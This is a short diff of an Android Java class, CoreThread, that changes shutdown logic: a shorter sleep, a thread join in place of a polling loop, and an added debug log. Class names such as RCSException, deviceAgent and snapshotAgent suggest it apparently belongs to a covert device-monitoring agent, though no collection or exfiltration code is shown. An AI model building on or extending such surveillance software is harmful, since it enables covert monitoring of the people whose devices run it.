@@ -68,14 +68,13 @@ public class CoreThread extends Activity implements Runnable {
 			
 			deviceAgent.sendMessage(Agent.AGENT_STOP, 0x0);
 			snapshotAgent.sendMessage(Agent.AGENT_STOP, 0x0);
-			
-			Utils.sleep(60000);
+	
+			Utils.sleep(10000);
 			
 			// Ci stiamo chiudendo
 			logDispatcher.halt();
+			logDispatcher.join();
 			
-			while (logDispatcher.isAlive())
-				Utils.sleep(250);
 		} catch (RCSException rcse) {
 			rcse.printStackTrace();
 			Log.d("Que", "RCSException() detected");
@@ -84,6 +83,7 @@ public class CoreThread extends Activity implements Runnable {
 			Log.d("Que", "Exception() detected");			
 		}
 		
+		Log.d("Que", "Exiting core");	
 		return;
 		
 		/*while (bStopCore == false) {
